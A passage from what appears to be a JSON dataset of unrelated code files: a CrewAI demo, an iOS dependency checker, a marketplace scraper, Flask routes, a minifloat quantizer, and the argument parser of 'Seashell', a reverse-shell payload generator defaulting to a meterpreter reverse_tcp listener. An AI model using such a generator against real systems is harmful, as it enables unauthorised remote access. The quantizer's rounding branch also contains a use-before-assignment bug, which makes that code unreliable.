\\x01(\\x08:\\x04true\\x12#\\n\\x15report_network_status\\x18\\x1e \\x01(\\x08:\\x04true\\x12%\\n\\x16report_security_status\\x18\\x1f \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\\"\\n\\x13report_crd_sessions\\x18$ \\x01(\\x08:\\x05\\x66\\x61lse\\x12!\\n\\x12report_peripherals\\x18% \\x01(\\x08:\\x05\\x66\\x61lse\\x12$\\n\\x15report_network_events\\x18) \\x01(\\x08:\\x05\\x66\\x61lse\\x12&\\n\\x17report_runtime_counters\\x18* \\x01(\\x08:\\x05\\x66\\x61lse\\x12)\\n\\x17\\x64\\x65vice_status_frequency\\x18\\t \\x01(\\x03:\\x08\\x31\\x30\\x38\\x30\\x30\\x30\\x30\\x30\\x12+\\n\\x19\\x65nable_granular_reporting\\x18  \\x01(\\x08:\\x04trueB\\x02\\x18\\x01\\x12<\\n+report_network_telemetry_collection_rate_ms\\x18! \\x01(\\x03:\\x07\\x33\\x36\\x30\\x30\\x30\\x30\\x30\\x12?\\n/report_network_telemetry_event_checking_rate_ms\\x18\\\" \\x01(\\x03:\\x06\\x36\\x30\\x30\\x30\\x30\\x30\\x12;\\n+report_device_audio_status_checking_rate_ms\\x1",
    "'''\nName\n    main.py\n\nAuthor\n    Written by Rip&Tear - CrewAI Discord Moderator .riptear\n    \nDate Sat 13th Apr 2024\n    \nDescription\n    This is a basic example of how to use the CrewAI library to create a simple research task. \n    The task is to research the topic of \"70s and 80s British rock bands\" and provide 5 paragraphs of information on the topic. \n    The task is assigned to a single agent (Researcher) who will use the ChatOllama model to generate the information. \n    The result of the task is written to a file called \"research_result.txt\".\n\nUsage\n    python main.py\n    \nOutput\n    The output of the task is written to a file called \"research_result.txt\".'''\n\n# Import required libraries - make sure the crewai and langchain_community packages are installed via pip\nimport os\nfrom crewai import Agent\nfrom crewai import Task\nfrom crewai import Crew, Process\n\nos.environ['OPENAI_API_BASE']='http://localhost:11434/v1'\nos.environ['OPENAI_API_KEY']='sk-111111111111111111111111111111111111111111111111'\nos.environ['OPENAI_MODEL_NAME']='mistral:7b-instruct-q4_0'\n\n# Create a function to log to a file with the date as the filename - this will be used as a callback function for the agent. this could be as complex as you like\ndef write_result_to_file(result):\n    filename = 'raw_output.log'\n    with open(filename, 'a') as file:\n        file.write(str(result))\n\n# Create the agent\nresearcher = Agent(\n    role='Researcher', # Think of this as the job title\n    goal='Research the topic', # This is the goal that the agent is trying to achieve\n    backstory='As an expert in the field of {topic}, you will research the topic and provide the necessary information', # This is the backstory of the agent, this helps the agent to understand the context of the task\n    max_iter=3, # This is the maximum number of iterations that the agent will use to generate the output\n    max_rpm=100, # This is the maximum number of requests per minute that the agent can make to the language model\n    verbose=True, # This is a flag that determines if the agent will print more output to the console \n    step_callback=write_result_to_file, # This is a callback function that will be called after each iteration of the agent\n    Allow_Delegation=False, # This is a flag that determines if the agent can delegate the task to another agent. As we are only using one agent, we set this to False\n    cache=False, # Indicates if the agent should use a cache for tool usage. A tool is not used in this example, so we set this to False\n)  \n\n# Create the task\nresearch_task = Task(\n    description='Research the topic', # This is a description of the task\n    agent=researcher, # This is the agent that will be assigned the task\n    expected_output='5 paragpahs of information on the topic', # This is the expected output of the taskafter its completion\n    verbose=True, # This is a flag that determines if the task will print more output to the console\n    output_file='research_result.txt' # This is the file where the output of the task will be written to, in this case, it is \"research_result.txt\"\n)           \n\n# Create the crew  \ncrew = Crew(\n  agents=[researcher], # This is a list of agents that will be part of the crew\n  tasks=[research_task], # This is a list of tasks that the crew will be assigned\n  process=Process.sequential, # This is the process that the crew will use to complete the tasks, in this case, we are using a sequential process\n  verbose=True, # This is a flag that determines if the crew will print more output to the console\n  memory=False, # This is a flag that determines if the crew will use memory to store information about the tasks in a vector database\n  cache=False, # This is a flag that determines if the crew will use a cache. A cache is not needed in this example, so we set this to False\n  max_rpm=100, # This is the maximum number of requests per minute that the crew can make to the language model \n)\n\n# Starting start the crew\nresult = crew.kickoff(inputs={'topic': '70s, 80s and 90s Australian rock bands'}) # Change the topic to whatever you want to research\nprint(result)\n",
    "import argparse\nimport os\nimport time\nfrom system_framework import system_frameworks_list, get_system_frame_platforms\nfrom min_os_version import read_minimum_os_version\n\n\ndef arg_parse():\n    # \u53c2\u6570\u89e3\u6790\u5f00\u59cb\n    parser = argparse.ArgumentParser(description=\"\u81ea\u52a8\u5206\u6790 App \u4e2d\u4f9d\u8d56\u7cfb\u7edf\u5e93\u7248\u672c\u548c\u5f53\u524d App \u6700\u4f4e\u7cfb\u7edf\u7248\u672c\u662f\u5426\u4e00\u81f4\")\n    # \u6dfb\u52a0\u53c2\u6570\n    parser.add_argument(\"-f\", \"--file\", help=\"\u8981\u5904\u7406\u7684 App \u6587\u4ef6\u8def\u5f84\uff0c\u6ce8\u610f\u4e0d\u662f .ipa \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u800c\u662f .app \u8def\u5f84\",\n                        required=True)\n    parser.add_argument(\"-o\", \"--output\", help=\"\u65e5\u5fd7\u8f93\u51fa\u8def\u5f84\")\n    # \u89e3\u6790\u547d\u4ee4\u884c\u53c2\u6570\n    args = parser.parse_args()\n    # \u83b7\u53d6\u53c2\u6570\u503c\n    app_path = args.file\n\n    output = args.output\n    if output is None:\n        output = os.path.dirname(app_path)\n    return app_path, output\n\n\ndef main():\n    start_time = time.time()\n\n    app_path, output = arg_parse()\n    print(\"==Step1 \u89e3\u6790\u53c2\u6570\")\n    print(\"\\tapp_path: \" + app_path)\n    print(\"\\toutput: \" + output)\n\n    print(\"\\n==Step2 \u901a\u8fc7 sh \u811a\u672c\u83b7\u53d6\u8be5 app \u4f9d\u8d56\u7684\u7cfb\u7edf\u5e93\u5217\u8868\uff08\u5254\u9664 weak \u4f9d\u8d56)\uff09\")\n    frameworks = system_frameworks_list(app_path)\n    print(f\"\\t\u7cfb\u7edf\u5e93\u5217\u8868: {frameworks}\")\n\n    print(\"\\n==Step3 \u8bfb\u53d6 info.plist \u6587\u4ef6\u83b7\u53d6\u8be5 app \u7248\u672c\u4fe1\u606f\")\n    min_os_version, app_version, app_build = read_minimum_os_version(app_path)\n    print(f\"\\tapp_version:{app_version} \\tapp_build:{app_build}\\tmin_ios_version:{min_os_version} \")\n\n    print(\"\\n==Step4 developer.apple.com\u67e5\u8be2\u83b7\u53d6\u7cfb\u7edf\u5e93\u6700\u4f4e\u652f\u6301\u7248\u672c\u53f7\uff0c\u5f97\u5230\u5f02\u5e38\u4f9d\u8d56\")\n    min_frameworks = get_system_frame_platforms(frameworks, min_os_version)\n    if len(min_frameworks) > 0:\n        print(f\"\\t\u5f02\u5e38\u4f9d\u8d56\uff1a{min_frameworks}\\n\\t!!!\u8bf7\u91cd\u70b9\u6392\u67e5!!!\uff0c\u4e0d\u7136\u53ef\u80fd\u5bfc\u81f4\u4f4e\u7248\u672c\u7cfb\u7edf\u542f\u52a8\u5d29\u6e83\")\n    else:\n        print(\"\u6b63\u5e38\u4f9d\u8d56\uff0c\u8bf7\u4fdd\u6301\")\n\n    end_time = time.time()\n    elapsed_time = end_time - start_time\n    print(f\"\\n\u672c\u6b21\u5206\u6790\u8017\u65f6:{elapsed_time:.3f}\u79d2\")\n\n\nif __name__ == '__main__':\n    main()\n\n# See PyCharm help at https://www.jetbrains.com/help/pycharm/\n",
    "import json\r\nfrom urllib import parse\r\nimport pandas as pd\r\nfrom bs4 import BeautifulSoup\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.wait import WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as ec\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\n\r\n\r\nBASEURL = 'https://megamarket.ru'\r\n\r\n\r\ndef get_pages_html(url):\r\n    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))\r\n    driver.maximize_window()\r\n    ITEMS = []\r\n    try:\r\n        for page in range(1, 100):\r\n            print(f\"[+] \u0421\u0442\u0440\u0430\u043d\u0438\u0446\u0430 {page}\")\r\n            driver.get(url=url.replace(f'page_num', f'page-{page}'))\r\n            WebDriverWait(driver, 60).until(\r\n                ec.presence_of_element_located((By.TAG_NAME, \"html\")))\r\n            if not get_items(driver.page_source, ITEMS):\r\n                break\r\n    except Exception as ex:\r\n        print(ex)\r\n    finally:\r\n        driver.close()\r\n        driver.quit()\r\n    return ITEMS\r\n\r\n\r\ndef get_items(html, items):\r\n    soup = BeautifulSoup(html, 'html.parser')\r\n    items_divs = soup.find_all('div', class_='catalog-item')\r\n    if len(items_divs) == 0:\r\n        return False\r\n    for item in items_divs:\r\n        link = BASEURL + item.find('a', class_='ddl_product_link').get('href')\r\n        item_price = item.find('div', class_='item-price')\r\n        if item_price:\r\n            item_price_result = item_price.find('span').get_text()\r\n            item_bonus = item.find('div', class_='item-bonus')\r\n            if item_bonus:\r\n                item_bonus_percent = item.find('span', class_='bonus-percent').get_text()\r\n                item_bonus_amount = item.find('span', class_='bonus-amount').get_text()\r\n                item_title = item.find('div', class_='item-title').get_text()\r\n                item_merchant_name = item.find('span', class_='merchant-info__name')\r\n                if item_merchant_name:\r\n                    item_merchant_name = item_merchant_name.get_text()\r\n                else:\r\n                    item_merchant_name = '-'\r\n\r\n                bonus = int(item_bonus_amount.replace(' ', ''))\r\n                price = int(item_price_result[0:-1].replace(' ', ''))\r\n                bonus_percent = int(item_bonus_percent.replace('%', ''))\r\n                items.append({\r\n                    '\u041d\u0430\u0438\u043c\u0435\u043d\u043e\u0432\u0430\u043d\u0438\u0435': item_title,\r\n                    '\u041f\u0440\u043e\u0434\u0430\u0432\u0435\u0446': item_merchant_name,\r\n                    '\u0426\u0435\u043d\u0430': price,\r\n                    '\u0421\u0443\u043c\u043c\u0430 \u0431\u043e\u043d\u0443\u0441\u0430': bonus,\r\n                    '\u041f\u0440\u043e\u0446\u0435\u043d\u0442 \u0431\u043e\u043d\u0443\u0441\u0430': bonus_percent,\r\n                    '\u0421\u0441\u044b\u043b\u043a\u0430 \u043d\u0430 \u0442\u043e\u0432\u0430\u0440': link\r\n                })\r\n    return True\r\n\r\n\r\ndef save_excel(data: list, filename: str):\r\n    \"\"\"\u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430 \u0432 excel \u0444\u0430\u0439\u043b\"\"\"\r\n    df = pd.DataFrame(data)\r\n    writer = pd.ExcelWriter(f'{filename}.xlsx')\r\n    df.to_excel(writer, sheet_name='data', index=False)\r\n    # \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0440\u0430\u0437\u043c\u0435\u0440\u044b \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0441\u0442\u043e\u043b\u0431\u0446\u0430 \u0432 \u0438\u0442\u043e\u0433\u043e\u0432\u043e\u043c \u0444\u0430\u0439\u043b\u0435\r\n    writer.sheets['data'].set_column(0, 1, width=50)\r\n    writer.sheets['data'].set_column(1, 2, width=30)\r\n    writer.sheets['data'].set_column(2, 3, width=8)\r\n    writer.sheets['data'].set_column(3, 4, width=20)\r\n    writer.sheets['data'].set_column(4, 5, width=15)\r\n    writer.close()\r\n    print(f'\u0412\u0441\u0435 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u043e \u0432 {filename}.xlsx')\r\n\r\n\r\ndef main():\r\n    target = input('\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430: ')\r\n    min_price = input('\u041c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0446\u0435\u043d\u0430 (enter, \u0447\u0442\u043e\u0431\u044b \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c): ')\r\n    min_price = min_price if min_price != '' else '0'\r\n    max_price = input('\u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0446\u0435\u043d\u0430 (enter, \u0447\u0442\u043e\u0431\u044b \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c): ')\r\n    max_price = max_price if max_price != '' else '9999999'\r\n    target_url = f\"{BASEURL}/catalog/page_num/?q={target}\"\r\n    if max_price and min_price and (max_price.isdigit() and min_price.isdigit()):\r\n        filter = {\r\n            \"88C83F68482F447C9F4E401955196697\": {\"min\": int(min_price), \"max\": int(max_price)},# \u0444\u0438\u043b\u044c\u0442\u0440 \u043f\u043e \u0446\u0435\u043d\u0435\r\n            \"4CB2C27EAAFC4EB39378C4B7487E6C9E\": [\"1\"]}# \u0444\u0438\u043b\u044c\u0442\u0440 \u043f\u043e \u043d\u0430\u043b\u0438\u0447\u0438\u044e \u0442\u043e\u0432\u0430\u0440\u0430\r\n        json_data = json.dumps(filter)\r\n        # \u041a\u043e\u0434\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 JSON \u0441\u0442\u0440\u043e\u043a\u0438 \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u0447\u0435\u0440\u0435\u0437 URL\r\n        url_encoded_data = parse.quote(json_data)\r\n        target_url += '#?filters=' + url_encoded_data\r\n\r\n    items = get_pages_html(url=target_url)\r\n    save_excel(items, target)\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()\r\n",
    "from flask import request, url_for, render_template\nfrom app import app\nfrom utils import get_db_connection\nfrom models.editor_model import *\nfrom math import isnan\n\n\n@app.route('/editor', methods=['GET', 'POST'])\ndef editor():\n    conn = get_db_connection()\n    content = {}\n    content_type = 'classes'\n    content['classes'] = get_classes(conn)\n    if request.method == 'POST':\n        if 'new_class_name' in request.form.keys():\n            add_class(conn, request.form['new_class_name'])\n        elif 'classes' in request.form.keys():\n            delete_classes(conn, request.form.getlist('classes'))\n        content['classes'] = get_classes(conn)\n    html = render_template('editor.html',\n                           content=content,\n                           content_type=content_type)\n    return html\n\n\n@app.route('/editor/property', methods=[\"GET\", \"POST\"])\ndef property():\n    conn = get_db_connection()\n    content = {'types': get_property_types(conn), 'properties': get_properties(conn)}\n    content_type = 'properties'\n    if request.method == 'POST':\n        if 'new_property_name' in request.form.keys():\n            add_property(conn, request.form['new_property_name'], request.form['properties_types'])\n        elif 'properties' in request.form.keys():\n            delete_properties(conn, request.form.getlist('properties'))\n        content['properties'] = get_properties(conn)\n\n    html = render_template('editor.html',\n                           content=content,\n                           content_type=content_type)\n    return html\n\n\n@app.route('/editor/relevant', methods=['GET', 'POST'])\ndef relevant_values():\n    conn = get_db_connection()\n    content = {'properties': get_full_properties(conn)}\n    content_type = 'relevant_values'\n    if request.method == 'POST':\n        if request.form['from'] == '' or request.form['to'] == '' or float(request.form['from']) > float(request.form['to']):\n            print('\u041e\u0448\u0438\u0431\u043a\u0430: \u043a\u0430\u043a\u043e\u0435-\u0442\u043e \u0438\u0437 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u043e\u0442/\u0434\u043e \u043d\u0435 \u0432\u0432\u0435\u0434\u0435\u043d\u043e, \u0438\u043b\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \"\u043e\u0442\" \u0431\u043e\u043b\u044c\u0448\u0435, \u0447\u0435\u043c \"\u0434\u043e\"')\n        else:\n            add_relevant_values(conn, request.form['properties_list'], request.form['from'], request.form['to'])\n    html = render_template('editor.html',\n                           content=content,\n                           content_type=content_type)\n    return html\n\n\n@app.route('/editor/property-class', methods=['GET', 'POST'])\ndef property_class():\n    conn = get_db_connection()\n    content = {'classes': get_classes(conn), 'properties': get_full_properties(conn)}\n    content_type = 'property_class'\n    if request.method == \"POST\":\n        edit_property_for_class(conn, request.form['classes'], request.form.getlist('properties'))\n\n    html = render_template('editor.html',\n                           content=content,\n                           content_type=content_type)\n    return html\n\n\n@app.route('/editor/relevant-class', methods=['GET', 'POST'])\ndef relevant_class():\n    conn = get_db_connection()\n    content = {'classes': get_classes(conn), 'properties': get_full_properties(conn)}\n    content_type = 'relevant-class'\n    if request.method == 'POST':\n        min_value, max_value = get_minmax_value(conn, request.form['properties'])\n        if request.form['from'] == '' or request.form['to'] == '' or float(request.form['from']) > float(request.form['to']):\n            print('\u041e\u0448\u0438\u0431\u043a\u0430: \u043a\u0430\u043a\u043e\u0435-\u0442\u043e \u0438\u0437 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u043e\u0442/\u0434\u043e \u043d\u0435 \u0432\u0432\u0435\u0434\u0435\u043d\u043e, \u0438\u043b\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \"\u043e\u0442\" \u0431\u043e\u043b\u044c\u0448\u0435, \u0447\u0435\u043c \"\u0434\u043e\"')\n        elif (min_value is not None and float(request.form['from']) < min_value) or (max_value is not None and float(request.form['to']) > max_value):\n            print('\u041e\u0448\u0438\u0431\u043a\u0430: \u043a\u0430\u043a\u043e\u0435-\u0442\u043e \u0438\u0437 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u043e\u0442/\u0434\u043e \u043c\u0435\u043d\u044c\u0448\u0435/\u0431\u043e\u043b\u044c\u0448\u0435, \u0447\u0435\u043c \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435/\u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u044d\u0442\u043e\u0433\u043e \u043f\u0440\u0438\u0437\u043d\u0430\u043a\u0430')\n        else:\n            add_relevant_values_for_class(conn, request.form['classes'], request.form['properties'], request.form['from'], request.form['to'])\n\n    html = render_template('editor.html',\n                           content=content,\n                           content_type=content_type)\n    return html\n\n\n@app.route('/editor/completeness', methods=['GET'])\ndef completeness():\n    conn = get_db_connection()\n    data = get_classes_properties(conn)\n    messages = []\n    for index, item in data.iterrows():\n        if isnan(item['min_value']):\n            messages.append(f'\u0414\u043b\u044f \u043a\u043b\u0430\u0441\u0441\u0430 {item['class_name']}, \u043f\u0440\u0438\u0437\u043d\u0430\u043a\u0430 {item['property_name']} \u043d\u0435 \u0443\u043a\u0430\u0437\u0430\u043d\u043e \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435.')\n        if isnan(item['max_value']):\n            messages.append(f'\u0414\u043b\u044f \u043a\u043b\u0430\u0441\u0441\u0430 {item['class_name']}, \u043f\u0440\u0438\u0437\u043d\u0430\u043a\u0430 {item['property_name']} \u043d\u0435 \u0443\u043a\u0430\u0437\u0430\u043d\u043e \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435.')\n    content = {'messages': messages}\n    content_type = 'completeness'\n\n    html = render_template('editor.html',\n                           content=content,\n                           content_type=content_type)\n    return html\n",
    "import torch\nimport torch.nn.functional as F\n#from qtorch.quant import float_quantize\nimport numpy as np\nfrom .number import BlockMinifloat, Number\nfrom .block_design import block_design\n\n\n__all__ = ['block_minifloat_quantize', \"quantizer\"]\n\n\ndef logr2(data):\n    const = torch.zeros_like(data) + 2**(-0.5)\n    return torch.log(data)/torch.log(const)\n\ndef r2(data):\n    return (2**(-0.5))**(data)\n\ndef add_r_(data):\n    r = torch.rand_like(data)\n    data.add_(r)\n\n\ndef block_minifloat_quantize(x, number, rounding=\"stochastic\", tensor_type=\"x\"):\n\n    assert isinstance(x, torch.Tensor), \"x is not a single precision Floating Point Tensor\"\n\n    # shared exponent\n    mean_func = lambda x, dim: torch.mean(x, dim)\n    max_func = lambda x, dim: torch.max(x, dim)[0]\n\n    # compute max exponent\n    max_exponent = block_design(x, number.tile, tensor_type, max_func) \n\n    # log\n    if number.man == 0:\n        i = x * 2**(-max_exponent + number.bias)\n        sgn = torch.sign(i)\n        #i = torch.log2(torch.abs(i)+1e-60)\n        i = logr2(torch.abs(i)+1e-60)\n        add_r_(i)\n        i.floor_()\n        #i = 2**(i)\n        i = r2(i)\n        i = torch.where(i<=2**(-2**(number.exp+1-1) + 1), torch.zeros_like(i), i)\n        i.clamp_(0, 1)\n        i = i * sgn\n        out = i * 2**(max_exponent-number.bias)\n        return out\n    \n    # fixed\n    elif number.exp == 0:\n        bits = number.man + 1\n        i = x * 2**(-max_exponent + number.bias + bits - 1)\n        #i = fixed_point_quantize(i, number.man+1, number.man, rounding=rounding)\n        if rounding == \"stochastic\":\n            r = torch.rand_like(i)\n            i.add_(r).floor_().clamp_(-2**(bits-1), 2**(bits-1)-1)\n        else:\n            i.round_().clamp_(-2**(bits-1), 2**(bits-1)-1)\n        out = i * 2**(max_exponent-number.bias -bits + 1)\n        return out\n    \n    # minifloat\n    else:\n        offset = max_exponent - number.emax\n\n        # shared exponent shifting\n        shift = 2**(-offset)\n        i = x * shift\n\n        # clamping at zero (uses QPyTorch float_quantizer - qtorch doesn't have a zero bit?)\n        if (number.flush_to_zero):\n            raise NotImplementedError\n            #k = float_quantize(i, number.exp, number.man, rounding=rounding)\n            #k = torch.where(torch.abs(i)<(2**(number.emin+1)), torch.zeros_like(i), k) # flush to zero\n            #out = k * 2**(offset) \n            #return out\n        \n\n        # handle subnormal and normal quantization\n        emin = number.emin \n        emax = number.emax # number.of_emax\n        esbn = 2**(emin+1)\n        lsbn = 2**(number.emax)\n        mval = 2**(number.man)\n        rlim = number.max_number\n\n        sgn = torch.sign(i)\n        i = torch.abs(i)\n        e = torch.floor(torch.log2(i+1e-60))\n        # clamp the exponent\n        e.clamp_(emin+1, emax) # emin+1 for subnormal region\n        # unpack frac for subnormal and normal region\n        ie = i*2**(-e)\n        me = 2**(e)\n        f = torch.where(i<esbn, ie, ie-1)\n\n\n        # rounding on frac\n        if rounding == \"stochastic\":\n            r = torch.rand_like(f)\n            f.mul_(mval).add_(r).floor_()\n            clipped = f.clamp_(0, mval)\n            clipped.div_(mval).mul_(me)\n        else:\n            f.mul_(mval).round_()\n            clipped.div_(mval).mul_(me)\n        # sign magnitude multiplication for subnormal and normal\n        k = torch.where(i<esbn, clipped, me+clipped)\n        k.clamp_(-rlim, rlim)\n        out = sgn * k * 2**(offset)\n        return out\n\n\ndef quantizer(forward_number=None, backward_number=None,\n              forward_rounding=\"stochastic\", backward_rounding=\"stochastic\",\n              clamping_grad_zero=False, backward_hooks=[]):\n    \"\"\"\n    Creates a quantization function to support quantizing forward and backward process differently.\n\n    Args:\n        - :param: forward_number (qtorch.Number, optional) : the number format used for forward quantization.\n                  if is None, the quantization would be a identity mapping.\n        - :param: backward_number (qtorch.Number, optional) : the number format used for backward quantization.\n                  if is None, the quantization would be a identity mapping.\n        - :param: forward_rounding (string) : rounding mode, \\\"stochastic\\\" or \\\"nearest\\\" (default: \\\"stochastic\\\")\n        - :param: backward_rounding (string) : rounding mode, \\\"stochastic\\\" or \\\"nearest\\\" (default: \\\"stochastic\\\")\n        - :param: clamping_grad_zero (bool) : zero out the gradient of numbers that are being clamped during forward propagation.\n                  currently requires forward_number to be a fixed point number.\n        - :param: backward_hooks (iterable) : iterable of functions that will be applied to gradients before backward quantization.\n                  For example, this can be used to support custom scaling.\n\n    Returns:\n        A quantization function as specified (torch.Tensor -> torch.Tensor)\n    \"\"\"\n    if forward_number is not None:\n        if forward_number.exp",
    "from seashell import *\nimport seashell\nimport argparse\nimport socket\nimport difflib, re\n\nparser = argparse.ArgumentParser(\n    prog=\"python3 -m seashell\",\n    description=\"Seashell is a CLI 'reverse' shell generator utility. Happy hacking!\",\n)\n\nparser.add_argument(\n    \"--verbose\", \"-V\", help=\"Sets logging level to [DEBUG]\", action=\"store_true\"\n)\n\nparser.add_argument(\n    \"-os\",\n    help=\"Filters results for [given] operating system\",\n    type=str,\n    choices=[\"windows\", \"mac\", \"linux\"],\n    default=\"linux\",\n)\n\nparser.add_argument(\n    \"-ip\",\n    help=\"Target IP\",\n    type=str,\n)\n\nparser.add_argument(\"-p\", \"--port\", help=\"Target port\", type=int, default=4444)\n\nparser.add_argument(\n    \"--type\",\n    \"-T\",\n    help=\"Filters results for [given] payload type \",\n    type=str,\n    choices=[\"reverse\", \"bind\", \"msfvenom\", \"hoaxshell\", \"listeners\"],\n    default=\"reverse\",\n)\n\nparser.add_argument(\n    \"--shell\",\n    \"-S\",\n    help=\"Shell to use\",\n    type=str,\n    choices=data[\"shells\"],\n    default=\"bash\",\n)\n\nparser.add_argument(\n    \"-P\",\n    \"--payload\",\n    help=\"metasploit payload to use for listener [msfconsole]\",\n    type=str,\n    default=\"windows/x64/meterpreter/reverse_tcp\"\n)\n\nparser.add_argument(\n    \"--interactive\",\n    \"-i\",\n    help=\"Enables interactive mode. Any arguments besides -V will be ignored!\",\n    action=\"store_true\",\n)\n\nparser.add_argument(\"term\", nargs=\"?\", help=\"Search term to filter payloads (use list to list payloads).\", type=str)\n\nargs = parser.parse_args()\n\n\ndef check_interface(i: str) -> str:\n    \"\"\"Validate interface name\"\"\"\n    try:\n        socket.inet_aton(i)\n    except socket.error:\n        try:\n            i = socket.gethostbyname(i)\n        except socket.gaierror:\n            logger.error(\n                f\"Error determining HTTP hosting address. Did you provide an interface or IP?\"\n            )\n            return None\n    return i\n\n\ndef handle_prompt_validation(prompts: list[dict]) -> list:\n    results = []\n    for prompt in prompts:\n        while True:\n            value = input(prompt[\"text\"]).strip()\n            value = value if value else prompt[\"default\"]\n            if prompt[\"check\"](value):\n                results.append(value)\n                break\n            logger.error(f\"{RED}Invalid input. Please provide valid data.{RESET}\")\n    return results\n\n\ndef filter_results() -> None:\n    logger.debug(\n        f\"{GREEN}{BOLD}[D]{RESET} Filtering results (OS: {GREEN}{BOLD}{seashell.USING_OS}{RESET}, TYPE: {GREEN}{BOLD}{seashell.PAYLOAD_TYPE} shell{RESET})\"\n    )\n    seashell.FILTERED_DATA = {\n        cmd.name: cmd\n        for cmd in filter(\n            lambda x: seashell.USING_OS in x.meta, data[seashell.PAYLOAD_TYPE]\n        )\n    }\n    if not seashell.FILTERED_DATA:\n        logger.error(f\"{RED}{BOLD}[!] Could not find any payloads. {RESET}\")\n    logger.debug(f\"{GREEN}[D]{RESET} Done.\")\n\n\ndef get_payload_matches(keyword: str, keys: dict[str, str]) -> list[str] | None:\n    matches = [\n        match\n        for token in keyword.split()\n        for match in difflib.get_close_matches(token, keys, cutoff=0.4, n=10)\n    ]\n    if not matches:\n        logger.error(f\"{RED}{BOLD}[!]{RESET} Could not find any payloads.\")\n        return None\n    \n    for _match in matches:\n        cmd = seashell.FILTERED_DATA[keys[_match]]\n        logger.info(\n            f\"{CYAN}{BOLD}[*]{RESET} {cmd.name:<20} {GREEN}{BOLD}{cmd.id}{RESET}\"\n        )\n    \n    return matches\n\n\n\ndef handle_interactive():\n    prompts = {\n        \"ip_prompt\": {\n            \"text\": f\"{BOLD}~>{RESET} Enter the {BOLD}{RED}IP{RESET}: \",\n            \"default\": \" \",\n            \"check\": lambda x: check_interface(x),\n        },\n        \"port_prompt\": {\n            \"text\": f\"{BOLD}~>{RESET} Specify the port {CYAN}{BOLD}(default: 4444){RESET}: \",\n            \"default\": 4444,\n            \"check\": lambda x: str(x).isdigit(),\n        },\n        \"payload_prompt\": {\n            \"text\": f\"{BOLD}~>{RESET} Select payload type {CYAN}{BOLD}[REVERSE, bind, msfvenom, hoaxshell]{RESET}: \",\n            \"default\": \"reverse\",\n            \"check\": lambda x: x in [\"reverse\", \"bind\", \"msfvenom\", \"hoaxshell\"],\n        },\n        \"os_prompt\": {\n            \"text\": f\"{BOLD}~>{RESET} Filter by {BOLD}OS{RESET} {CYAN}{BOLD}[LINUX, mac, windows]{RESET}: \",\n            \"default\": \"linux\",\n            \"check\": lambda x: x in [\"windows\", \"linux\", \"mac\"],\n        },\n    }\n    # Get listener address\n    addr = handle_prompt_validation(\n        [prompts[\"ip_prompt\"], prompts[\"port_prompt\"]]\n    )\n    seashell.ADDRESS = check_interface(addr[0]), addr[1]\n    # Select payload type\n    seashell.USING_OS = handle_prompt_validation([prompts[\"os_prompt\"]])[0]\n    seashell.PAYLOAD_TYPE = handle_prompt_validation([prompts[\"payload_prompt\"]])[0]\n    filter_results()\n    \n    processed_keys = {key.lower(): key for key in seashell.FILTERED_DATA.keys()}\n    while True:\n        keyword = input(f\"{BOLD}[SEARCH]{RESET} \").lower()\n        if not keyword:\n            logger.warning(f",
    "import os\nimport sqlite3\n\nDEBUG = 10\nINFO = 20\nWARNING = 30\nERROR = 40\nCRITICAL = 50\n\n\ndef create_logger(\n    name=\"log\",\n    dir_name=\"logs\",\n    level=\"info\",\n    columns=[\"ts\", \"data\"],\n):\n    level_str = level.upper()\n    if level_str == \"DEBUG\":\n        level = DEBUG\n    elif level_str == \"INFO\":\n        level = INFO\n    elif level_str == \"WARNING\":\n        level = WARNING\n    elif level_str == \"ERROR\":\n        level = ERROR\n    elif level_str == \"CRITICAL\":\n        level = CRITICAL\n    else:\n        raise ValueError(\n            \"level must be one of 'debug', 'info', 'warning', 'error', or 'critical'\")\n\n    return Logger(name, dir_name, level=level, columns=columns, create=True)\n\n\ndef open_logger(name=\"log\", dir_name=\".\"):\n    return Logger(name, dir_name, create=False)\n\n\nclass Logger:\n    def __init__(self, name, dir_name, level=None, columns=None, create=True):\n        self.name = name\n        self.dir_name = dir_name\n        if create:\n            os.makedirs(self.dir_name, exist_ok=True)\n            self.level = level\n\n        self.db_path = os.path.join(self.dir_name, self.name + \".db\")\n        self.connection = 